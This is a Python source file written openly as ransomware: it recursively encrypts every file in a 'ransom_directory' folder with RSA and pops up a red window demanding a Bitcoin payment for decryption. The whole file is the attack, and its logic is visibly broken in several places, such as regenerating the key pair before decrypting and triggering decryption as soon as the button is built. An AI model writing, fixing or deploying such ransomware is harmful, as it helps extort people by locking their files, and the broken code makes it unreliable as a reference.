import rsa, os
import tkinter as tk

def generate_key_pair() -> tuple:
    
    (public_key, private_key) = rsa.newkeys(1024)
    
    with open('public.pem', 'w+') as f:
        f.write(public_key.save_pkcs1().decode())
    with open('private.pem', 'w+') as f:
        f.write(private_key.save_pkcs1().decode())
        
    return public_key, private_key

def read_n_write(file_name: str, key: rsa.key.PublicKey, mode: str) -> None:
    
    with open(file_name, 'r') as f:
        data = f.read()
    
    if mode == 'encrypt':
        data = rsa.encrypt(data.encode(), key)
    elif mode == 'decrypt':
        data = rsa.decrypt(data.encode(), key).decode()
    
    with open(file_name, 'w+') as f:
        f.write(data)
    
    return None

def get_files_recursive(base_path: str) -> list:
    
    files = []
    
    for (dirpath, dirnames, filenames) in os.walk(base_path):
        files.extend([os.path.join(dirpath, file) for file in filenames])
    
    return files

def your_files_are_encrypted() -> None:
        
        root = tk.Tk()
        
        root.title("Your files are encrypted")
        root.geometry("300x100")
        root.configure(background='red')
        
        label = tk.Label(root, text="Your files are encrypted", font=("Arial", 15))
        btc_addrs = tk.Label(root, text="Pay 1$ for decryption : 1F1tAaz5x1HMaxCNLbtCMamxw6x4pdNn4xqX", font=("Arial", 15))
        
        label.pack(pady=10)
        btc_addrs.pack(pady=10)
        
        button = tk.Button(root, text="Click here when paid", command=main('decrypt'))
        
        root.mainloop()
        
def thank_you() -> None:
        
        root = tk.Tk()
        
        root.title("Thank you")
        root.geometry("300x100")
        root.configure(background='green')
        
        label = tk.Label(root, text="Thank you for paying", font=("Arial", 15))
        
        label.pack(pady=10)
        
        root.after(10000, lambda: root.destroy())

def main(mode: str = 'encrypt'):
    
    current_path = os.getcwd()
    
    public_key, private_key = generate_key_pair()
    
    files = get_files_recursive(current_path + '/ransom_directory')
    
    for file in files:
        if mode == 'encrypt':
            read_n_write(file, public_key, mode)
            your_files_are_encrypted()
        elif mode == 'decrypt':
            read_n_write(file, private_key, mode)
            thank_you()